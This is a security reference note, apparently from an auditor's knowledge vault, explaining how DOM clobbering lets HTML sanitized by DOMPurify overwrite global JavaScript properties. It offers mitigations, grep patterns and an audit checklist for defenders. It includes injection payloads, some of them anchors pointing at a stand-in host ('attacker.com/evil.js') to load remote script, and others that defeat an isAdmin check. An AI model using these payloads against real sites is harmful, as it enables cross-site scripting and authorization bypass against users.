# DOM Clobbering — Modern Frameworks Elite Tactics

> **Context:** DOM Clobbering exploits the browser's implicit mapping of HTML element `id` and `name` attributes to global JavaScript variables. It bypasses DOMPurify and other sanitizers which allow "safe" HTML but still allow ID/name attributes that create property collisions in global scope.

**Tags:** #medium #xss #dom #javascript #bypass
**OWASP:** A03:2021 Injection (Client-Side)
**CVSS Base:** 6.1–8.8 (escalates via chain to full XSS)

---

## Why It Bypasses Modern Sanitizers

DOMPurify allows tags like `<img>`, `<a>`, `<form>` by default. The dangerous payload is **not** the tag — it's the `id` and `name` attributes that the browser automatically exposes as global JS properties.

```html
<!-- DOMPurify ALLOWS this (no script tag, no event handler) -->
<img id="config">

<!-- But in JS, window.config is now the <img> element -->
<!-- If app does: script.src = window.config.apiUrl — BROKEN -->
```

---

## Attack Classes

### 1. Level-1 Clobbering — Global Variable Overwrite

**How it works:** Elements with an `id` attribute are accessible as `window.{id}`.

**Example:**
```html
<!-- Inject via user-controlled HTML -->
<img id="isAdmin">
```
```javascript
// Application checks:
if (!window.isAdmin) { redirectToLogin(); }
// window.isAdmin is now an HTMLImageElement (truthy!) — check bypassed!
```

---

### 2. Level-2 Clobbering — Property Path Injection

**How it works:** Nested collisions using `<a>` or `<form>` with `name` attributes create object-like property paths.

**Exploit anatomy:**
```html
<!-- Creates: window.config.apiUrl = <a> element -->
<a id="config"><a id="config" name="apiUrl" href="https://attacker.com/evil.js"></a></a>
```
```javascript
// Application does:
let scriptSrc = window.config.apiUrl; // → "https://attacker.com/evil.js"
document.createElement('script').src = scriptSrc; // XSS!
```

---

### 3. `document.querySelector` Confusion

Some frameworks use `document.currentScript`, `document.getElementById`, or `document.forms` in ways that DOM Clobbering can intercept.

**Classic target:**
```javascript
// If document.currentScript is clobbered:
<a id="currentScript" name="src" href="//attacker.com/payload.js"></a>
// document.currentScript.src → attacker URL
```

---

### 4. Framework-Specific Targets

#### Angular
- Targets: `platformBrowserDynamic`, any `window.ng` access before bootstrap.

#### React (Unexpected)
- React is generally immune, but SSR (Server-Side Rendering) hydration via `window.__NEXT_DATA__` or `window.__REDUX_STATE__` are high-value targets.
- **Payload:** `<a id="__NEXT_DATA__" name="props" href="data:application/json,{&quot;evil&quot;:true}">`.

#### Vue.js
- Targets global config via `window.Vue.config` before component initialization.

---

## Advanced Bypass: Clobbering `document.write` Protection

Some applications use `document.write` to detect safe contexts. This itself can be clobbered:
```html
<form id="write"><input name="call"></form>
<!-- document.write is now an HTMLInputElement; calling document.write() throws an error -->
<!-- If the app's security check relies on document.write working, it silently fails -->
```

---

## Detection Protocol

**`grep_search`:**
- `window.config`, `window.settings`, `window.APP_CONFIG` (global config objects vulnerable to L1 clobbering)
- `document.getElementById` where result is used as an object (not just `.textContent`)
- `DOMPurify.sanitize(` — **not** a complete mitigation without `FORBID_ATTR: ['id', 'name']`

**Verify mitigation completeness:**
```javascript
// PARTIAL fix (still vulnerable to id/name clobbering):
DOMPurify.sanitize(input);

// COMPLETE fix:
DOMPurify.sanitize(input, { FORBID_ATTR: ['id', 'name'] });
```

---

## Chained Exploitation Paths

```
DOM Clobbering → window.config.scriptUrl hijacked → Dynamic script injection → XSS
DOM Clobbering → Auth bypass (truthy globalVar) → Unauthorized access to protected UI
DOM Clobbering → React SSR hydration poisoning → Client-side state corruption
DOM Clobbering + Trusted Types bypass → Full CSP circumvention
```

---

## Strategic Checklist for Auditor
1. [ ] Check where application reads from `window.*` or `document.*` global properties.
2. [ ] Verify if user-controlled HTML is sanitized with `FORBID_ATTR: ['id', 'name']`.
3. [ ] Scan for Bootstrap or jQuery plugins that use `data-` attributes as config sources.
4. [ ] Check SSR hydration targets (`__NEXT_DATA__`, `__REDUX_STATE__`).

---

*Tags: #dom-clobbering #xss #bypass #sanitizer #javascript #shiva-vault*
